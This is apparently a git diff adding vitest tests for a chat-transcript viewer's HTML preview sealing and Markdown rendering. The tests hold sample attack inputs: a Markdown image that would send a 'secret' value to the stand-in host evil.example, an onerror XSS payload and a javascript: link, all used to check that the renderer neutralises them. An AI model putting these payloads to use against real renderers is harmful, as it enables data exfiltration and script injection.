@@ -2,8 +2,12 @@ import { describe, expect, it } from 'vitest'
 
 import type { Item, Row } from '@sessclone/shared'
 
-import { writtenBefore } from './artifacts'
+import { createElement } from 'react'
+import { renderToStaticMarkup } from 'react-dom/server'
+
+import { sealed, writtenBefore } from './artifacts'
 import { decode, parseEnvelope } from './envelope'
+import { MarkdownText } from './markdown'
 import { groupSteps, stepsLabel } from './steps'
 
 const base = (offset: number, at: string | null = null) => ({
@@ -200,5 +204,42 @@ describe('writtenBefore', () => {
 
   it('is missing when this transcript never wrote the file', () => {
     expect(writtenBefore(items, '/c.html', 40)).toEqual({ status: 'missing' })
+  })
+})
+
+describe('sealed', () => {
+  it('puts the preview policy after the doctype, or first without one', () => {
+    const page = sealed('<!DOCTYPE html><p>x</p>')
+    expect(
+      page.startsWith(
+        '<!DOCTYPE html><meta http-equiv="Content-Security-Policy"',
+      ),
+    ).toBe(true)
+    expect(page).toContain("default-src 'none'")
+    expect(sealed('<p>x</p>').startsWith('<meta http-equiv')).toBe(true)
+  })
+})
+
+const html = (text: string) =>
+  renderToStaticMarkup(createElement(MarkdownText, { text }))
+
+describe('MarkdownText', () => {
+  it('never loads an image: it becomes a link', () => {
+    const out = html('![secret](https://evil.example/p?k=abc)')
+    expect(out).not.toContain('<img')
+    expect(out).toContain('href="https://evil.example/p?k=abc"')
+  })
+
+  it('shows raw HTML as text and drops javascript: links', () => {
+    const out = html('<img src=x onerror=alert(1)> [go](javascript:alert(1))')
+    expect(out).not.toContain('<img')
+    expect(out).toContain('&lt;img')
+    expect(out).not.toContain('javascript:')
+  })
+
+  it('labels a code block with its language and highlights it', () => {
+    const out = html('```ts\nconst a = 1\n```')
+    expect(out).toContain('>ts<')
+    expect(out).toContain('hljs-keyword')
   })
 })
